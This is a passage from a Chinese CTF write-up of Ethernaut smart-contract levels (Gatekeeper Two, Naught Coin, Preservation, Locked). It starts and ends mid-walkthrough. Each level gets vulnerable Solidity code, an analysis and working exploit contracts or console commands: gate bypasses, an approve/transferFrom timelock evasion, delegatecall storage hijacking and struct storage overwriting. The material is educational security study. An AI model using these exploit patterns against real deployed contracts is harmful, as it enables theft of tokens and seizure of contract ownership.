之后部署并编译攻击合约，同时更改实例合约的地址：  
之后点击"hack"来实施攻击  
之后当“await contract.entrant()”非0x000...000时点击“submit instance”来提交示例即可！
#### Gatekeeper Two
##### 闯关要求
和上一题一样，完成三个需求。
##### 合约代码
    pragma solidity ^0.4.18;
    contract GatekeeperTwo {
      address public entrant;
      modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
      }
      modifier gateTwo() {
        uint x;
        assembly { x := extcodesize(caller) }
        require(x == 0);
        _;
      }
      modifier gateThree(bytes8 _gateKey) {
        require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
        _;
      }
      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
      }
    }
##### 合约分析
第一个条件：我们可以通过部署合约来实现绕过  
第二个条件：gateTwo中extcodesize
用来获取指定地址的合约代码大小。这里使用的是内联汇编来获取调用方(caller)的代码大小，一般来说，当caller为合约时，获取的大小为合约字节码大小,caller为账户时，获取的大小为
0 。条件为调用方代码大小为0 ，由于合约在初始化，代码大小为0的。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。  
第三个条件：这里判断的是msg.sender，所以要在代码里进行实时计算。异或的特性就是异或两次就是原数据。所以将sender和FFFFFFFFFFFFFFFF进行异或的值就是我们想要的值。  
最后攻击合约如下：
    pragma solidity ^0.4.18;
    contract GatekeeperTwo {
      address public entrant;
      modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
      }
      modifier gateTwo() {
        uint x;
        assembly { x := extcodesize(caller) }
        require(x == 0);
        _;
      }
      modifier gateThree(bytes8 _gateKey) {
        require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
        _;
      }
      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
      }
    }
    contract attack{
        function attack(address param){
            GatekeeperTwo a =GatekeeperTwo(param);
            bytes8 _gateKey = bytes8((uint64(0) -1) ^ uint64(keccak256(this)));
            a.enter(_gateKey);
        }
    }
##### 攻击流程
首先，获取一个实例：  
之后获取合约地址：  
之后在remix中编译部署攻击合约：  
之后查看entrant的值：  
之后点击“submit instance”来提交示例：  
#### Naught Coin
##### 闯关要求
NaughtCoin是一个ERC20代币，你已经拥有了所有的代币。但是你只能在10年的后才能将他们转移。你需要想出办法把它们送到另一个地址，这样你就可以把它们自由地转移吗，让后通过将token余额置为0来完成此级别。
##### 合约代码
    pragma solidity ^0.4.18;
    import 'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol';
     contract NaughtCoin is StandardToken {
      using SafeMath for uint256;
      string public constant name = 'NaughtCoin';
      string public constant symbol = '0x0';
      uint public constant decimals = 18;
      uint public timeLock = now + 10 years;
      uint public INITIAL_SUPPLY = (10 ** decimals).mul(1000000);
      address public player;
      function NaughtCoin(address _player) public {
        player = _player;
        totalSupply_ = INITIAL_SUPPLY;
        balances[player] = INITIAL_SUPPLY;
        Transfer(0x0, player, INITIAL_SUPPLY);
      }
      function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
        super.transfer(_to, _value);
      }
      // Prevent the initial owner from transferring tokens until the timelock has passed
      modifier lockTokens() {
        if (msg.sender == player) {
          require(now > timeLock);
          _;
        } else {
         _;
        }
      } 
    }
##### 合约分析
从以上代码我们可以看出合约NaughtCoin继承了StandardToken但是没有对父合约做重写，导致利用父合约的函数可以进行及时转账。而子合约NaughtCoin也没有什么问题，那我们还是回过头来看看import的父合约
StandardToken.sol。  
其实根据 ERC20
的标准我们也知道，转账有两个函数，一个transfer一个transferFrom，题目中代码只重写了transfer函数，那么重写transferFrom就是一个可利用的点了。直接看看StandardToken.sol代码：
    contract StandardToken {
        using ERC20Lib for ERC20Lib.TokenStorage;
        ERC20Lib.TokenStorage token;
        ...
        function transfer(address to, uint value) returns (bool ok) {
             return token.transfer(to, value);
           }
        function transferFrom(address from, address to, uint value) returns (bool ok) {
             return token.transferFrom(from, to, value);
           }
        ...
    }
跟进ERC20Lib.sol：
    library ERC20Lib {
        ...
        function transfer(TokenStorage storage self, address _to, uint _value) returns (bool success) {
            self.balances[msg.sender] = self.balances[msg.sender].minus(_value);
            self.balances[_to] = self.balances[_to].plus(_value);
            Transfer(msg.sender, _to, _value);
            return true;
        }
        function transferFrom(TokenStorage storage self, address _from, address _to, uint _value) returns (bool success) {
            var _allowance = self.allowed[_from](msg.sender);
            self.balances[_to] = self.balances[_to].plus(_value);
            self.balances[_from] = self.balances[_from].minus(_value);
            self.allowed[_from](msg.sender) = _allowance.minus(_value);
            Transfer(_from, _to, _value);
            return true;
        }
        ...
        function approve(TokenStorage storage self, address _spender, uint _value) returns (bool success) {
            self.allowed[msg.sender](_spender) = _value;
            Approval(msg.sender, _spender, _value);
            return true;
        }
    }
此处可以直接调用这个transferFrom了。但是transferFrom有一步权限验证，要验证这个msg.sender是否被_from（实际上在这里的情景的就是自己是否给自己授权了），那么我们同时还可以调用approve
给自己授权。 攻击代码如下：  
根据以上分析，我们可以构造如下EXP:
    await contract.approve(player,toWei(1000000))
    await contract.transferFrom(player,contract.address,toWei(1000000))
##### 攻击流程
点击“Get new instance”来获取一个实例：  
之后查看当前账户余额  
之后使用approve进行授权  
然后再通过transferFrom来实施转账  
之后查看账户余额：  
最后点击“submit instance”来提交该实例：  
#### Preservation
##### 闯关条件
此合同使用库存储两个不同时区的两个不同时间，构造函数为每次要存储的库创建两个实例。 而玩家的目标是获取合约的owner权限。
##### 合约代码
    pragma solidity ^0.4.23;
    contract Preservation {
      // public library contracts 
      address public timeZone1Library;
      address public timeZone2Library;
      address public owner; 
      uint storedTime;
      // Sets the function signature for delegatecall
      bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
      constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
        timeZone1Library = _timeZone1LibraryAddress; 
        timeZone2Library = _timeZone2LibraryAddress; 
        owner = msg.sender;
      }
      // set the time for timezone 1
      function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
      }
      // set the time for timezone 2
      function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
      }
    }
    // Simple library contract to set the time
    contract LibraryContract {
      // stores a timestamp 
      uint storedTime;  
      function setTime(uint _time) public {
        storedTime = _time;
      }
    }
##### 合约分析
以上合约中用到了delegatecall()函数，一般情况下delegatecall用来调用其他合约、库的函数，比如 a 合约中调用 b
合约的函数，执行该函数使用的 storage便是a的。举个例子：
    contract A{
        uint public x1;
        uint public x2;
        function funca(address param){
            param.delegate(bytes4(keccak256("funcb()")));
        }
    }
    contract B{
        uint public y1;
        uint public y2;
        function funcb(){
            y1=1;
            y2=2;
        }
    }
在上述合约中，一旦在a中调用了b的funcb函数，那么对应的a中 x1就会等于y1，x2就会等于 2。
在这个过程中实际b合约的funcb函数把storage里面的slot 1的值更换为了1，把slot 2的值更换为了
2，那么由于delegatecall的原因这里修改的是a的storage，对应就是修改了 x1，x2。
那么这个题就很好办了，我们调用Preservation的setFirstTime函数时候实际通过delegatecall
执行了LibraryContract的setTime函数，修改了slot 1，也就是修改了timeZone1Library变量。
这样，我们第一次调用setFirstTime将timeZone1Library变量修改为我们的恶意合约的地址，第二次调用setFirstTime就可以执行我们的任意代码了。
由此，我们可构建一下EXP：
    pragma solidity ^0.4.23;
    contract PreservationPoc {
      address public timeZone1Library;
      address public timeZone2Library;
      address public owner; 
      uint storedTime;
      function setTime(uint _time) public {
        owner = address(_time);
      }
    }
##### 攻击流程
点击“Get new instance”获取一个实例  
之后在remix中部署恶意智能合约：  
之后在控制台执行以下命令：
    await contract.setSecondTime(恶意合约地址)
    await contract.setFirstTime(player地址)
之后我们就成为了合约的拥有者  
最后点击“submit instance”来提交示例即可：  
#### locked
##### 闯关条件
此名称注册器已锁定，将不接受任何注册的新名称。而玩家的目标是解锁此注册器。
##### 合约代码
    pragma solidity ^0.4.23; 
    // A Locked Name Registrar
    contract Locked {
        bool public unlocked = false;  // registrar locked, no name updates
        struct NameRecord { // map hashes to addresses
            bytes32 name; // 
            address mappedAddress;
        }
        mapping(address => NameRecord) public registeredNameRecord; // records who registered names 
        mapping(bytes32 => address) public resolve; // resolves hashes to addresses
        function register(bytes32 _name, address _mappedAddress) public {
            // set up the new NameRecord
            NameRecord newRecord;
            newRecord.name = _name;
            newRecord.mappedAddress = _mappedAddress; 
            resolve[_name] = _mappedAddress;
            registeredNameRecord[msg.sender] = newRecord; 
            require(unlocked); // only allow registrations if contract is unlocked
        }
    }
##### 合约分析
通过查看以上代码我们可以发现“unlocked”从一开始就被设置为“false”而之后合约中再没有出现过"unlocked"，那么我们如何来改变"unlocked"的值呢？关于这一个我在之前的智能合约审计系列3中讲过一个“变量覆盖”的专题，里面有相关的描述，这里不再赘述了，总体来说这里的漏洞出现在结构体的重定义导致变量覆盖问题。
在该合约中，下面的三行diam重新定义了结构体，因此会覆盖第一个、第二个存储块，因为我们只需要见_name设置为bytes32(1)就可以将unlocked变为“ture”
    NameRecord newRecord;
    newRecord.name = _name;
    newRecord.mappedAddress = _mappedAddress;
EXP如下
    pragma solidity ^0.4.23; 
    // A Locked Name Registrar
    contract Locked {
        bool public unlocked = false;  // registrar locked, no name updates
        struct NameRecord { // map hashes to addresses
            bytes32 name; // 
            address mappedAddress;
        }
        mapping(address => NameRecord) public registeredNameRecord; // records who registered names 
        mapping(bytes32 => address) public resolve; // resolves hashes to addresses
        function register(bytes32 _name, address _mappedAddress) public {
            // set up the new NameRecord
            NameRecord newRecord;
            newRecord.name = _name;
            newRecord.mappedAddress = _mappedAddress; 
            resolve[_name] = _mappedAddress;
            registeredNameRecord[msg.sender] = newRecord; 
            require(unlocked); // only allow registrations if contract is unlocked
        }
    }
    contract attack{
        function hack(address param){
            Locked a = locked(param);
            a.register(bytes32(1),address(msg.sender));
        }
    }
##### 攻击流程
获取一个新的示例  